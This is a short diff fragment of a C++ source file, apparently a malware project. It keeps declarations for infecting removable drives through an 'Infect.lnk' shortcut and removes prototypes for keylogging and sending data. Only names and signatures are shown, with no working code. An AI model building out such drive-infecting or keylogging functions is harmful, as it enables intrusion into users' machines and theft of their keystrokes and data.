@@ -14,13 +14,7 @@ using namespace std;
 #define INFECT_LINK_NAME "Infect.lnk"
 
 string allDrives;
-int age=0;
 
-int get_setAge();
-bool checkRecordSize();
-void sendData();
-void logUserTime();
-void logKey();
 char getRemovableDisk();
 void infectDrive(char driveLetter);
 char* getRandomName();
